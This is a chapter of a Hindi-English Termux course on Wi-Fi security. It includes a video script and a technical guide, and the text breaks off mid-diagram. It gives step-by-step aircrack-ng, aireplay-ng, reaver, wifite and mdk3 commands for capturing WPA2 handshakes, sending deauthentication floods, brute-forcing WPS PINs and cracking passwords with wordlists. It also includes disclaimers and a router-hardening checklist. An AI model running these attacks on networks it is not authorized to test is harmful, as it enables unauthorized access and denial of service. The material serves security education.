# Chapter 38: Wi-Fi Security Tools

> **Module:** 6 - Security  
> **Chapter:** 38 of 61  
> **Duration:** 20-25 Minutes  
> **Difficulty:** ⭐⭐⭐⭐ Advanced

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | WiFi security fundamentals & tools |
| Tools Covered | aircrack-ng suite, monitor mode, handshake capture |
| Commands Reference | 25+ WiFi security commands |
| Practice Exercises | Hands-on security auditing |
| Troubleshooting | Common WiFi tool issues |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 38
Title: WiFi Security Tools | Complete Guide | T3rmuxk1ng
Duration: 20-25 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 1:00]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course by T3rmuxk1ng!

Aaj ka chapter bahut special hai - WiFi Security Tools!

WiFi security ek aisa topic hai jo har cybersecurity enthusiast ko 
interest karta hai. Sab yahi jaanna chahte hain - "Kaise WiFi ka 
password crack karte hain?" ya "Apne WiFi ko kaise secure karein?"

Aaj hum dono cheezein seekhenge - attack aur defense dono.

Lekin ye bhi samjhein ki WiFi hacking ke liye special hardware 
chahiye - external WiFi adapter. Phone ka internal WiFi card 
monitor mode support nahi karta.

Is chapter mein hum cover karenge:
- WiFi security fundamentals
- Encryption types - WEP, WPA, WPA2, WPA3
- Monitor mode aur external adapter setup
- aircrack-ng suite complete guide
- Handshake capture aur cracking
- Apne WiFi ko kaise secure karein
- Tools jo root ke bina kaam karte hain

Disclaimer: Ye video sirf educational purpose ke liye hai. 
Kisi ke bhi WiFi par bina permission ke attack karna illegal hai.
Sirf apne network par practice karein ya written permission lein.

To chaliye shuru karte hain!

---

[SECTION 1: WIFI SECURITY FUNDAMENTALS - 1:00 to 4:30]
─────────────────────────────────────────────────────────────────────────────

Sabse pehle basics samjhte hain.

WiFi ka full form hai - Wireless Fidelity. Ye ek wireless networking 
technology hai jo radio waves use karti hai data transmit karne ke liye.

WiFi network mein ye components hote hain:

┌─────────────────────────────────────────────────────────────────────────┐
│                      WIFI NETWORK COMPONENTS                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│    ┌──────────────┐         Radio Waves        ┌──────────────┐         │
│    │   Router     │ ◄─────────────────────────►│   Client     │         │
│    │  (Access     │     2.4GHz / 5GHz          │  (Laptop,    │         │
│    │   Point)     │                            │   Phone)     │         │
│    └──────────────┘                            └──────────────┘         │
│           │                                                              │
│           │                                                              │
│           ▼                                                              │
│    ┌──────────────┐                                                     │
│    │   Internet   │                                                     │
│    └──────────────┘                                                     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

WiFi security ka matlab hai - ye ensure karna ki sirf authorized 
users hi network connect kar sakein, aur data secure rahe.

WiFi security ke main threats:

1. Unauthorized Access - Koi bhi person network connect ho jaye
2. Eavesdropping - Data sniff karna (packet capture)
3. Man-in-the-Middle - Data ko intercept aur modify karna
4. Deauthentication - Network se users disconnect karna
5. Password Cracking - WiFi password recover karna
6. Rogue Access Points - Fake WiFi network create karna

WiFi security ka pehla line of defense hai - ENCRYPTION.

---

[SECTION 2: ENCRYPTION TYPES - 4:30 to 9:00]
─────────────────────────────────────────────────────────────────────────────

Chaliye ab samjhte hain WiFi encryption types:

┌─────────────────────────────────────────────────────────────────────────┐
│                    WIFI ENCRYPTION EVOLUTION                             │
├──────────────┬──────────────┬────────────────────────────────────────────┤
│ Type         │ Year         │ Security Level                             │
├──────────────┼──────────────┼────────────────────────────────────────────┤
│ WEP          │ 1997         │ ❌ BROKEN - Never use!                     │
│ WPA          │ 2003         │ ⚠️ WEAK - Avoid if possible                │
│ WPA2         │ 2004         │ ✅ GOOD - Currently standard               │
│ WPA3         │ 2018         │ ✅ EXCELLENT - Future standard             │
└──────────────┴──────────────┴────────────────────────────────────────────┘

[WEP - Wired Equivalent Privacy]

WEP sabse purana encryption hai. 1997 mein aaya tha.

Problem: WEP ka encryption algorithm EXTREMELY weak hai.

WEP cracking mein:
- 64-bit WEP: 5-10 minutes mein crack
- 128-bit WEP: 10-30 minutes mein crack

WEP kaise kaam karta hai:
- RC4 stream cipher use karta hai
- Static key use hota hai (key change nahi hoti)
- IV (Initialization Vector) 24-bit hai - bohot chhota

Attack method:
- Packets capture karo
- IV collect karo (thousands)
- Statistical attack se key recover karo

AGAR AAPKA ROUTER WEP USE KAR RAHA HAI - IMMEDIATELY CHANGE KAREIN!

[WPA - WiFi Protected Access]

WEP ke baad WPA aaya. Improvements:
- TKIP (Temporal Key Integrity Protocol)
- Per-packet key mixing
- Larger IV (48-bit)

Lekin WPA bhi weak hai:
- TKIP vulnerability discovered
- KRACK attack applicable

[WPA2 - Current Standard]

WPA2 current standard hai. Improvements:
- AES (Advanced Encryption Standard)
- CCMP (Counter Mode CBC-MAC Protocol)
- Stronger encryption
- 4-way handshake

WPA2 security:
- Password brute-force se crack hota hai
- Dictionary attack se crack hota hai
- Handshake capture required
- Weak password = vulnerable

[WPA3 - Latest Standard]

WPA3 sabse latest hai. Features:
- SAE (Simultaneous Authentication of Equals)
- Forward secrecy
- Protection against offline attacks
- 192-bit security suite (Enterprise)

WPA3 improvements:
- Dictionary attacks blocked
- Offline attacks not possible
- Forward secrecy - password change se past data secure

Lekin WPA3 abhi widely supported nahi hai. Naye routers mein milta hai.

[WPS - WiFi Protected Setup]

WPS ek convenience feature hai:
- Push button method
- PIN method

WPS PIN vulnerability:
- 8-digit PIN
- Can be brute-forced
- 3-10 hours mein crack possible

RECOMMENDATION: WPS DISABLE KAREIN!

---

[SECTION 3: MONITOR MODE & HARDWARE - 9:00 to 12:30]
─────────────────────────────────────────────────────────────────────────────

Ab aata hai sabse important topic - Monitor Mode.

Normal mode mein WiFi card sirf apne liye meant packets receive karta hai.
Monitor mode mein WiFi card SAARE packets capture karta hai - 
chahe wo uske liye hon ya na hon.

┌─────────────────────────────────────────────────────────────────────────┐
│                    MONITOR MODE VS MANAGED MODE                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  MANAGED MODE (Normal)           │  MONITOR MODE (Promiscuous)          │
│  ─────────────────────           │  ─────────────────────────           │
│  Only own packets                │  All packets in air                  │
│  Connected to network            │  Not connected                       │
│  Can send/receive data           │  Only receive (capture)              │
│  Normal internet use             │  Packet sniffing, auditing           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

IMPORTANT: Android phones ka internal WiFi card MONITOR MODE 
support NAHI karta!

Ye Android limitation hai - internal WiFi firmware restricted hai.

Isliye EXTERNAL WiFi adapter chahiye.

[External WiFi Adapter Requirements]

Compatible adapters:
┌─────────────────────────────────────────────────────────────────────────┐
│                RECOMMENDED WIFI ADAPTERS FOR ANDROID                     │
├──────────────────────────────────┬──────────────────────────────────────┤
│ Adapter                          │ Notes                                │
├──────────────────────────────────┼──────────────────────────────────────┤
│ Alfa AWUS036NHA                  │ Best for Termux, Atheros chipset     │
│ Alfa AWUS036NAC                 │ AC adapter, good performance         │
│ TP-Link TL-WN722N (v1)          │ Classic, monitor mode support        │
│ Panda PAU05                     │ Budget friendly, works well          │
│ Alfa AWUS036NH                  │ Long range, good sensitivity         │
└──────────────────────────────────┴──────────────────────────────────────┘

Required chipset: Realtek RTL8812AU, Atheros AR9271, Ralink RT3070

[OTG Adapter Setup]

Phone mein connect karne ke liye:

1. USB OTG Adapter chahiye
   - Micro USB to USB (old phones)
   - USB-C to USB (new phones)

2. Phone ko OTG support hona chahiye
   - Most Android phones support
   - Check: Settings → Connected devices

3. External power may be needed
   - WiFi adapters need good power
   - Use powered USB hub for stable operation

Setup process:
┌─────────────────────────────────────────────────────────────────────────┐
│                         OTG SETUP PROCESS                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Phone (USB-C) ──► OTG Adapter ──► USB Hub (Optional) ──► WiFi Adapter  │
│                                                                          │
│  If power issues:                                                        │
│  Phone ──► OTG ──► Powered USB Hub ──► WiFi Adapter                      │
│                          │                                               │
│                          ▼                                               │
│                      Power Bank                                         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

---

[SECTION 4: AIRCRACK-NG INSTALLATION - 12:30 to 15:00]
─────────────────────────────────────────────────────────────────────────────

Ab Termux mein aircrack-ng install karte hain.

aircrack-ng ek complete suite hai WiFi security auditing ke liye.

Suite components:
┌─────────────────────────────────────────────────────────────────────────┐
│                    AIRCRACK-NG SUITE COMPONENTS                          │
├──────────────────────┬──────────────────────────────────────────────────┤
│ Tool                 │ Purpose                                         │
├──────────────────────┼──────────────────────────────────────────────────┤
│ airmon-ng            │ Enable/disable monitor mode                     │
│ airodump-ng          │ Capture packets, scan networks                  │
│ aireplay-ng          │ Packet injection, deauth attacks                │
│ aircrack-ng          │ Crack WEP/WPA keys                              │
│ airdecap-ng          │ Decrypt capture files                           │
│ airolib-ng           │ Manage WPA PMK tables                           │
│ airserv-ng           │ TCP/IP server for aircrack                      │
│ airtun-ng            │ Virtual tunnel interface                        │
└──────────────────────┴──────────────────────────────────────────────────┘

Installation commands:

    # Update Termux
    pkg update && pkg upgrade -y

    # Install dependencies
    pkg install root-repo -y
    pkg install wget git python python2 make clang -y

    # Install aircrack-ng
    pkg install aircrack-ng -y

    # Verify installation
    aircrack-ng --help

    # Check version
    aircrack-ng --version

If package not found in termux main repo, compile from source:

    # Clone repository
    git clone https://github.com/aircrack-ng/aircrack-ng
    
    cd aircack-ng
    
    # Install build dependencies
    pkg install build-essential libnl libopenssl libpcap sqlite -y
    
    # Configure and build
    ./configure --without-opt
    
    make
    
    make install

Alternative: Use additional packages

    pkg install wireless-tools
    pkg install iw

NOTE: Monitor mode ke liye ROOT access required hai Android pe!

---

[SECTION 5: NETWORK SCANNING - 15:00 to 17:30]
─────────────────────────────────────────────────────────────────────────────

Chaliye ab network scanning karte hain.

[Step 1: Check WiFi Interface]

Pehle check karein ki WiFi adapter detect ho raha hai:

    # List all wireless interfaces
    iwconfig
    
    # Or use ifconfig
    ifconfig
    
    # Or check network interfaces
    ls /sys/class/net/

External adapter usually wlan1 ya wlan2 naam se show hota hai.
Internal adapter usually wlan0 hai.

[Step 2: Kill Interfering Processes]

Monitor mode enable karne se pehle interfering processes kill karein:

    # Kill processes that might interfere
    airmon-ng check kill

This kills NetworkManager, wpa_supplicant, etc.

[Step 3: Enable Monitor Mode]

    # Enable monitor mode
    airmon-ng start wlan1

Replace wlan1 with your interface name.

Verify monitor mode:

    iwconfig

Output should show: Mode:Monitor

[Step 4: Scan Networks]

Ab networks scan karein:

    # Scan all networks
    airodump-ng wlan1mon

    # Scan specific channel
    airodump-ng -c 6 wlan1mon

    # Scan specific band
    airodump-ng --band bg wlan1mon    # 2.4GHz
    airodump-ng --band a wlan1mon     # 5GHz

Output columns:
- BSSID: Router ka MAC address
- PWR: Signal power
- Beacons: Beacon frames count
- #Data: Data packets
- CH: Channel number
- MB: Maximum speed
- ENC: Encryption type
- CIPHER: Cipher algorithm
- AUTH: Authentication method
- ESSID: Network name

[Step 5: Target Specific Network]

    # Capture packets from specific network
    airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon

    # -c: Channel number
    # --bssid: Target BSSID
    # -w: Write to file

---

[SECTION 6: HANDSHAKE CAPTURE & CRACKING - 17:30 to 21:00]
─────────────────────────────────────────────────────────────────────────────

WPA/WPA2 cracking ke liye HANDSHAKE capture karna padta hai.

[What is Handshake?]

Handshake wo process hai jab client aur router connection establish karte hain.
4-way handshake mein:
1. Router sends random number (ANonce)
2. Client sends random number (SNonce) + proof
3. Router sends confirmation
4. Connection established

Is handshake mein encrypted password hash hota hai.
Ye hash offline crack kiya ja sakta hai.

┌─────────────────────────────────────────────────────────────────────────┐
│                      WPA2 4-WAY HANDSHAKE                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Client                                    Access Point                  │
│    │                                            │                        │
│    │ ◄──────────  ANonce ───────────────────► │                        │
│    │                                            │                        │
│    │ ───────────► SNonce + MIC ─────────────► │                        │
│    │                                            │                        │
│    │ ◄──────────  ANonce + MIC ────────────── │                        │
│    │                                            │                        │
│    │ ───────────► ACK ──────────────────────► │                        │
│    │                                            │                        │
│    ▼                                            ▼                        │
│  Connected!                                 Connected!                   │
│                                                                          │
│  This handshake can be captured and cracked offline!                     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

[Capturing Handshake]

Method 1: Passive Capture (Wait for client to connect)

    airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon

Wait for someone to connect. Jab client connect hoga, 
handshake capture ho jaayega.

Top right corner pe "WPA handshake: AA:BB:CC:DD:EE:FF" dikhega.

Method 2: Active Capture (Force reconnection)

Client ko force karo reconnect karne ke liye:

    # Deauthenticate client
    aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan1mon

    # -0: Deauth attack
    # 5: Number of deauth packets
    # -a: Access point BSSID
    # -c: Client MAC (optional, use for specific client)

Jab client reconnect karega, handshake capture ho jaayega.

[Cracking Handshake]

Handshake capture hone ke baad, password crack karein:

    # Dictionary attack
    aircrack-ng -w /path/to/wordlist.txt capture-01.cap

    # Common wordlists
    # /sdcard/wordlist.txt
    # rockyou.txt

    # Using aircrack-ng with specific bssid
    aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

Popular wordlists:
- rockyou.txt (14 million passwords)
- darkc0de.lst
- CrackStation wordlist

Install rockyou in Termux:

    # Download rockyou
    wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz

    # Extract
    tar -xzf rockyou.txt.tar.gz

Success output:

    Opening capture-01.cap
    Read 1500 packets.

    BSSID              PWR  Beacons    #Data  CH   ESSID

    AA:BB:CC:DD:EE:FF  -45     500      200   6   MyWiFi

    BSSID              STATION            PWR   Packets

    AA:BB:CC:DD:EE:FF  FF:EE:DD:CC:BB:AA  -40     150

                           Aircrack-ng 1.7

      [00:00:05] 5000/14000000 keys tested (1000.00 k/s)

                           KEY FOUND! [ password123 ]

---

[SECTION 7: WPS ATTACKS - 21:00 to 23:00]
─────────────────────────────────────────────────────────────────────────────

WPS attacks ek alag method hai WiFi cracking ka.

WPS PIN attack tools:
- reaver
- bully
- wifite

WPS attack requirements:
- WPS enabled on router
- WPS PIN not locked
- Good signal strength

[Reaver Installation]

    pkg install reaver

[WPS Attack Process]

    # Put interface in monitor mode
    airmon-ng start wlan1

    # Scan for WPS enabled networks
    wash -i wlan1mon

    # Attack WPS
    reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv

    # -i: Interface
    # -b: BSSID
    # -vv: Very verbose output

WPS attack time:
- 4-10 hours typically
- Depends on router
- Some routers lock after failed attempts

[Wifite - Automated Attack]

    pkg install wifite

    # Run automated attack
    wifite

Wifite automatically:
- Scans networks
- Selects target
- Tries WPS attack
- Tries handshake capture
- Tries dictionary attack

---

[SECTION 8: WIFI DEAUTHENTICATION - 23:00 to 24:30]
─────────────────────────────────────────────────────────────────────────────

Deauthentication ek DoS attack hai.

[What is Deauth?]

Deauth packets send karo router/client ko:
- Client disconnect ho jaata hai
- Network unavailable lagta hai
- Handshake capture ke liye use hota hai

[Deauth Attack Command]

    # Deauth all clients
    aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan1mon

    # Deauth specific client
    aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan1mon

    # Continuous deauth (Ctrl+C to stop)
    aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan1mon

    # -0: Deauth attack type
    # Number after -0: Number of packets (0 = infinite)

LEGAL WARNING: Ye attack sirf apne network par test karein!
Kisi aur ka network deauth karna ILLEGAL hai!

[mdk3/mdk4 for Advanced Deauth]

    pkg install mdk3

    # Deauth attack using mdk3
    mdk3 wlan1mon d -c 6 -B AA:BB:CC:DD:EE:FF

---

[SECTION 9: ALTERNATIVES WITHOUT ROOT - 24:30 to 26:30]
─────────────────────────────────────────────────────────────────────────────

Root nahi hai? Kya kar sakte hain?

[Tools That Work Without Root]

1. Network Information Apps
   - WiFi Analyzer (from Play Store)
   - Shows channel, signal, encryption
   - Helps in network auditing

2. Termux Network Tools (No Root)
   - nmap - Network scanning
   - netcat - Port scanning
   - curl/wget - HTTP analysis

3. Router Admin Access
   - Access router admin panel
   - Check connected devices
   - Change security settings

4. WPS Connect Apps (Gray Area)
   - Some apps claim WPS attack
   - Mostly don't work on modern routers
   - Use only on your own network

[WiFi Pineapple - Hardware Alternative]

WiFi Pineapple ek dedicated hardware hai:

┌─────────────────────────────────────────────────────────────────────────┐
│                      WIFI PINEAPPLE FEATURES                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  WiFi Pineapple is a wireless auditing platform                          │
│                                                                          │
│  Features:                                                               │
│  • Passive & Active reconnaissance                                       │
│  • Man-in-the-middle attacks                                            │
│  • Captive portals                                                       │
│  • Deauthentication attacks                                             │
│  • Handshake capture                                                     │
│  • Easy web interface                                                    │
│                                                                          │
│  Models:                                                                 │
│  • WiFi Pineapple Mark VII (Latest)                                     │
│  • WiFi Pineapple Nano (Portable)                                       │
│                                                                          │
│  Price: ~$100-200 USD                                                    │
│                                                                          │
│  Works standalone - no root needed on phone!                            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

---

[SECTION 10: SECURING YOUR WIFI - 26:30 to 29:00]
─────────────────────────────────────────────────────────────────────────────

Ab security ki baat karte hain - apne WiFi ko kaise secure karein?

┌─────────────────────────────────────────────────────────────────────────┐
│                    WIFI SECURITY CHECKLIST                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ 1. ENCRYPTION                                                        │
│     • Use WPA3 if available                                              │
│     • Use WPA2-AES minimum                                               │
│     • Never use WEP                                                      │
│     • Avoid WPA-TKIP                                                     │
│                                                                          │
│  ✅ 2. PASSWORD                                                          │
│     • Minimum 12 characters                                              │
│     • Mix of upper, lower, numbers, symbols                             │
│     • Not in dictionary                                                  │
│     • Not related to you (name, birthday, address)                      │
│     • Change every 3-6 months                                            │
│                                                                          │
│  ✅ 3. WPS                                                               │
│     • DISABLE WPS completely                                             │
│     • Major security vulnerability                                       │
│                                                                          │
│  ✅ 4. ADMIN ACCESS                                                      │
│     • Change default admin password                                      │
│     • Disable remote admin access                                        │
│     • Use strong admin password                                          │
│                                                                          │
│  ✅ 5. NETWORK CONFIGURATION                                             │
│     • Change default SSID                                                │
│     • Disable SSID broadcast (optional)                                  │
│     • Enable MAC filtering (optional, weak)                              │
│     • Use separate guest network                                         │
│                                                                          │
│  ✅ 6. ROUTER SECURITY                                                   │
│     • Update router firmware regularly                                   │
│     • Disable UPnP if not needed                                         │
│     • Enable firewall                                                    │
│     • Disable WDS (Wireless Distribution System)                        │
│                                                                          │
│  ✅ 7. MONITORING                                                        │
│     • Check connected devices regularly                                  │
│     • Enable logging                                                     │
│     • Set up alerts for new connections                                  │
│                                                                          │
│  ✅ 8. ADVANCED                                                          │
│     • Use VPN for sensitive activities                                   │
│     • Consider enterprise authentication                                 │
│     • Set up RADIUS server for large networks                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

[Generate Strong Password]

    # Generate random password
    openssl rand -base64 12

    # Or use Python
    python -c "import secrets; print(secrets.token_urlsafe(16))"

[Check Your WiFi Security]

    # Install WiFi analyzer
    pkg install aircrack-ng

    # Scan your own network (with permission)
    airodump-ng wlan1mon

    # Check encryption type
    # Check if WPS is enabled
    # Test password strength

---

[SECTION 11: SUMMARY - 29:00 to 31:00]
─────────────────────────────────────────────────────────────────────────────

To dosto, Chapter 38 complete! Let's summarize:

✅ WiFi Security Fundamentals - Components aur threats samjhe
✅ Encryption Types - WEP, WPA, WPA2, WPA3 evolution
✅ Monitor Mode - External adapter requirement samjha
✅ aircrack-ng Suite - Installation aur components
✅ Network Scanning - airmon-ng aur airodump-ng
✅ Handshake Capture - WPA2 cracking process
✅ WPS Attacks - reaver aur wifite
✅ Deauthentication - aireplay-ng usage
✅ No-Root Alternatives - Tools and WiFi Pineapple
✅ WiFi Security - Apne network ko secure karna

Important Commands yaad rakhein:

┌─────────────────────────────────────────────────────────────────────────┐
│                    CHAPTER 38 - IMPORTANT COMMANDS                       │
├─────────────────────────────────────────────────────────────────────────┤
│ airmon-ng start wlan1       │ Enable monitor mode                       │
│ airodump-ng wlan1mon        │ Scan all networks                         │
│ airodump-ng -c 6 --bssid X  │ Capture specific network                  │
│ aireplay-ng -0 5 -a X       │ Deauth attack                             │
│ aircrack-ng -w wordlist.cap │ Crack handshake                           │
│ reaver -i wlan1mon -b X     │ WPS attack                                │
│ wash -i wlan1mon            │ Scan WPS networks                         │
└─────────────────────────────────────────────────────────────────────────┘

REMINDER:
- WiFi hacking requires external adapter
- Monitor mode needs ROOT on Android
- Always practice on your own network
- Illegal hacking has serious consequences
- Use knowledge for security, not harm

Next Chapter 39 mein hum seekhenge:
- Bluetooth Security
- Bluetooth hacking tools
- Blueborne attack
- BLE devices security
- Bluetooth reconnaissance

Agar ye video helpful lagi, to:
👍 Like button press karein
🔔 Subscribe karein, notification bell on karein
💬 Koi sawal ho to comment mein poochein
📤 Share karein friends ke saath

Main har comment ka reply karta hoon.

Thank you for watching! See you in Chapter 39!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. WiFi Security Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WIFI SECURITY ARCHITECTURE                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│                         ┌─────────────────┐                             │
│                         │   Attacker      │                             │
│                         │   (Kali/Termux) │                             │
│                         └────────┬────────┘                             │
│                                  │                                      │
│                                  │ Monitor Mode                         │
│                                  │ Packet Injection                     │
│                                  ▼                                      │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │                      AIR GAP (Radio Waves)                        │   │
│  │                                                                    │   │
│  │   Threats:                                                         │   │
│  │   • Eavesdropping (Packet Capture)                                │   │
│  │   • Deauthentication (DoS)                                        │   │
│  │   • Man-in-the-Middle                                             │   │
│  │   • Rogue Access Points                                           │   │
│  │   • Jamming                                                       │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                  │                                      │
│                    ┌─────────────┴─────────────┐                        │
│                    │                           │                        │
│                    ▼                           ▼                        │
│            ┌──────────────┐            ┌──────────────┐                 │
│            │  Access      │            │   Client     │                 │
│            │  Point       │◄──────────►│   Devices    │                 │
│            │  (Router)    │   4-way    │   (Phone,    │                 │
│            │              │  Handshake │    Laptop)   │                 │
│            └──────┬───────┘            └──────────────┘                 │
│                   │                                                      │
│                   │ Wired Connection                                     │
│                   ▼                                                      │
│            ┌──────────────┐                                             │
│            │   Internet   │                                             │
│            └──────────────┘                                             │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. WiFi Encryption Comparison

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ENCRYPTION COMPARISON TABLE                           │
├──────────────┬─────────┬─────────┬─────────┬─────────┬─────────────────┤
│ Feature      │   WEP   │   WPA   │  WPA2   │  WPA3   │ WPS            │
├──────────────┼─────────┼─────────┼─────────┼─────────┼─────────────────┤
│ Year         │  1997   │  2003   │  2004   │  2018   │ 2006           │
│ Cipher       │  RC4    │  RC4    │  AES    │  AES    │ PIN-based      │
│ Key Size     │  64/128 │  256    │  256    │  256    │ 8-digit PIN    │
│ IV Size      │  24-bit │  48-bit │  48-bit │  N/A    │ N/A            │
│ Key Rotation │  Static │ Dynamic │ Dynamic │ Dynamic │ N/A            │
│ Security     │  ❌      │  ⚠️      │  ✅      │  ✅      │ ❌              │
│ Crack Time   │  <1hr   │  Hours   │  Days*  │  Years  │ 4-10 hrs       │
│ KRACK Vuln   │  Yes    │  Yes     │  Yes**  │  No     │ N/A            │
│ Offline Atk  │  Easy   │  Hard    │  Hard   │  No     │ Yes            │
└──────────────┴─────────┴─────────┴─────────┴─────────┴─────────────────┘

* WPA2 crack time depends on password strength
** KRACK patch available for WPA2

WEP: Never use - completely broken
WPA: Avoid if possible
WPA2: Current standard - use strong password
WPA3: Best - not widely available yet
WPS: Disable immediately
```

### 3. Attack Methodology Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WIFI PENETRATION TESTING METHODOLOGY                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  PHASE 1: RECONNAISSANCE                                                 │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ • Enable monitor mode                                            │   │
│  │ • Scan for networks (airodump-ng)                               │   │
│  │ • Identify target network                                        │   │
│  │ • Note: BSSID, Channel, Encryption type, WPS status             │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                  │                                      │
│                                  ▼                                      │
│  PHASE 2: VULNERABILITY ASSESSMENT                                      │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ • Check encryption type (WEP/WPA/WPA2/WPA3)                     │   │
│  │ • Check if WPS is enabled                                       │   │
│  │ • Identify connected clients                                    │   │
│  │ • Check signal strength                                         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                  │                                      │
│                                  ▼                                      │
│  PHASE 3: EXPLOITATION                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                   │   │
│  │  If WEP:                                                         │   │
│  │  ├── Capture packets (airodump-ng)                              │   │
│  │  ├── Inject packets (aireplay-ng)                               │   │
│  │  └── Crack key (aircrack-ng)                                    │   │
│  │                                                                   │   │
│  │  If WPA/WPA2:                                                    │   │
│  │  ├── Capture handshake (airodump-ng)                            │   │
│  │  ├── Force reconnection (aireplay-ng -0)                        │   │
│  │  └── Crack offline (aircrack-ng -w wordlist)                    │   │
│  │                                                                   │   │
│  │  If WPS enabled:                                                 │   │
│  │  ├── Check WPS lock status (wash)                               │   │
│  │  └── Brute-force PIN (reaver/bully)                             │   │
│  │                                                                   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                  │                                      │
│                                  ▼                                      │
│  PHASE 4: POST-EXPLOITATION                                              │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ • Connect to network                                             │   │
│  │ • Further network enumeration                                   │   │
│  │ • Document findings                                              │   │
│  │ • Report to owner                                                │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 4. Monitor Mode Explained

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WIFI INTERFACE MODES                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  MANAGED MODE (Default)                                                  │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                   │   │
│  │   ┌─────┐                    ┌─────────┐                        │   │
│  │   │Phone│ ─── My Data ─────► │  Router │                        │   │
│  │   └─────┘                    └─────────┘                        │   │
│  │      │                                                           │   │
│  │      │ Only receives packets addressed to it                     │   │
│  │      │ Normal WiFi operation                                    │   │
│  │                                                                   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  MONITOR MODE (Promiscuous)                                              │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                   │   │
│  │   ┌─────┐                    ┌─────────┐                        │   │
│  │   │Phone│ ─────────────────► │  Router │                        │   │
│  │   └─────┘                    └─────────┘                        │   │
│  │      ▲                                                           │   │
│  │      │                                                           │   │
│  │      │ Captures ALL packets in the air                          │   │
│  │      │ Beacons, Data, Handshakes from ALL networks              │   │
│  │      │ Not connected to any network                             │   │
│  │                                                                   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  MASTER MODE (Access Point)                                              │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                   │   │
│  │   ┌─────┐                    ┌─────────┐                        │   │
│  │   │Phone│ ◄─── Clients ───── │ Devices │                        │   │
│  │   │(AP) │                    │         │                        │   │
│  │   └─────┘                    └─────────┘                        │   │
│  │                                                                   │   │
│  │   Phone acts as access point (create hotspot)                   │   │
│  │                                                                   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 5. Handshake Capture Process

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WPA2 HANDSHAKE CAPTURE                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Step 1: Setup                                                           │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ airmon-ng start wlan1                  # Enable monitor mode    │   │
│  │ airodump-ng wlan1mon                   # Find target            │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Step 2: Target Selection                                                │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon  │   │
│  │                                                                  │   │
│  │ -c 6              : Channel 6                                   │   │
│  │ --bssid AA:BB:... : Target router MAC                           │   │
│  │ -w capture        : Save to capture-01.cap                      │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Step 3: Capture Handshake                                               │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                  │   │
│  │  Option A: Wait for new client to connect (Passive)             │   │
│  │  Option B: Force client reconnection (Active)                   │   │
│  │                                                                  │   │
│  │  aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan1mon                 │   │
│  │                                                                  │   │
│  │  Watch for: "WPA handshake: AA:BB:CC:DD:EE:FF"                  │   │
│  │                                                                  │   │
